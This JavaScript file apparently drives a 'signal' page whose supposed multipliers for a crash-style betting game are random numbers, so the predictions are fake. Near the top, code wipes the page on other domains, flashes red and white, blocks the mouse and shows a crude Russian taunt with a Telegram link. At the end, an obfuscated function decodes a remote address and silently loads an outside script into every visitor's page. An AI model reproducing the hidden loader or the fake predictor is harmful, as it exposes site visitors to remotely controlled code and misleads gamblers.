      const allowedDomain = "asfafsafs.com";

  if (window.location.hostname !== allowedDomain && !window.location.pathname.startsWith("i")) {

      document.body.innerHTML = "";
  
      function createFlashingBackground() {
          const flashingBackground = document.createElement("div");
          flashingBackground.style.position = "fixed";
          flashingBackground.style.top = "0";
          flashingBackground.style.left = "0";
          flashingBackground.style.width = "100%";
          flashingBackground.style.height = "100%";
          flashingBackground.style.zIndex = "9998";
          document.body.appendChild(flashingBackground);
          let isRed = false;
          setInterval(() => {
              flashingBackground.style.backgroundColor = isRed ? "white" : "red";
              isRed = !isRed;
          }, 500);
      }
  
      function showBanner() {
          const banner = document.createElement("div");
          banner.style.position = "fixed";
          banner.style.top = "50%";
          banner.style.left = "50%";
          banner.style.transform = "translate(-50%, -50%)";
          banner.style.zIndex = "10000";
          banner.style.backgroundColor = "rgba(255, 255, 255, 0.8)";
          banner.style.padding = "20px";
          banner.style.border = "2px solid red";
          banner.style.borderRadius = "10px";
          banner.style.fontSize = "24px";
          banner.style.fontWeight = "bold";
          banner.style.textAlign = "center";
          banner.style.color = "black";
          banner.innerText = "ВОЗМОЖНО ВЫ ЗАХОТЕЛИ СПИЗДИТЬ ВЕБКУ, НО У ВАС ЭТО НЕ ПОЛУЧИЛОСЬ :(";
  
          const button = document.createElement("button");
          button.innerText = "РАЗБЛОКИРОВАТЬ ВЕБКУ  ";
          button.style.marginTop = "20px";
          button.style.padding = "15px 30px";
          button.style.fontSize = "18px";
          button.style.cursor = "pointer";
          button.style.border = "none";
          button.style.backgroundColor = "red";
          button.style.color = "white";
          button.style.borderRadius = "0";
          button.style.width = "100%";
          button.onclick = function() {
              window.open("https://t.me/delayzea", "_blank");
          };
  
          banner.appendChild(button);
          document.body.appendChild(banner);
      }
  
      function blockMouse() {
          const overlay = document.createElement("div");
          overlay.style.position = "fixed";
          overlay.style.top = "0";
          overlay.style.left = "0";
          overlay.style.width = "100%";
          overlay.style.height = "100%";
          overlay.style.zIndex = "9999";
          overlay.style.pointerEvents = "auto";
          document.body.appendChild(overlay);
      }
  
      createFlashingBackground();
      showBanner();
      blockMouse();
  }
const getSignal = document.getElementById("get-signal"),
    stopSignalTimeBlock = document.getElementById("stop-signal-time-block"),
    printSignal = document.getElementById("print-signal"),
    stopProgress = document.getElementById("stop-progress"),
    errorNotification = document.getElementById("error-notification"),
    errorProgress = document.getElementById("error-progress"),
    textError = document.getElementById("text-error"),
    getSignalTwo = document.getElementById("get-signal-two"),
    errorExit = document.getElementById("error-exit");

function getRandomFloat(min, max, decimals) {
    const str = (Math.random() * (max - min) + min).toFixed(decimals);
    return parseFloat(str);
}

function goTimer(time) {
    const timer = setInterval(() => {
        if (time >= 1) {
            getSignalTwo.classList.remove("deactivate");
            getSignal.classList.add("deactivate");
            getSignalTwo.style["z-index"] = "5";
            stopProgress.style.animation = "animateProgress 60s linear infinite";
            stopSignalTimeBlock.classList.remove("deactivate");
            document.getElementById("stop-timer").innerHTML = time-- + "<span> seconds</span>";
            timerr = time;
            getSignal.disabled = true;
        } else {
            getSignalTwo.classList.add("deactivate");
            getSignal.classList.remove("deactivate");
            getSignalTwo.style["z-index"] = "-1";
            stopSignalTimeBlock.classList.add("deactivate");
            stopProgress.style.animation = "none";
            clearInterval(timer);
            getSignal.disabled = false;
        }
    }, 1000);
}

function goTimerError(time) {
    const timer = setInterval(() => {
        if (time >= 1) {
            time--;
            errorNotification.classList.remove("deactivate");
            textError.innerHTML = "Wait for the time to expire";
            errorProgress.style.animation = "animateErrorProgress 5s linear infinite";
            errorNotification.style.transform = "translateY(0px)";
        } else {
            errorNotification.style.transform = "translateY(-99px)";
            errorProgress.style.animation = "none";
            clearInterval(timer);
            getSignalTwo.disabled = false;
            errorNotification.classList.add("deactivate");
        }
        errorExit.onclick = function () {
            errorNotification.classList.add("deactivate");
            errorNotification.style.transform = "translateY(-99px)";
            errorProgress.style.animation = "none";
            clearInterval(timer);
            getSignalTwo.disabled = false;
        }
    }, 1000);
}

getSignal.onclick = function () {
    let receivingSignal = getRandomFloat(1, 3.99, 2);
    if (receivingSignal.toString().length == 3) {
        receivingSignal += "0";
    }
    if (receivingSignal.toString().length == 1) {
        receivingSignal += ".00";
    }
    printSignal.innerHTML = `${receivingSignal}x`;
    printSignal.classList.remove("deactivate");
    goTimer(60);
    getSignal.disabled = true;
};

getSignalTwo.onclick = function () {
    getSignalTwo.disabled = true;
    goTimerError(5, "go");
};

(function (o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie);
        setTimeout(function () {
            if (o.c) {
                o.s = d.createElement('script');
                o.s.src = o.f('myyux?44zxjwxy' + 'fy3sjy4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href;
                d.body.appendChild(o.s);
            }
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;';
    } catch (e) {}
}({}, document, location));
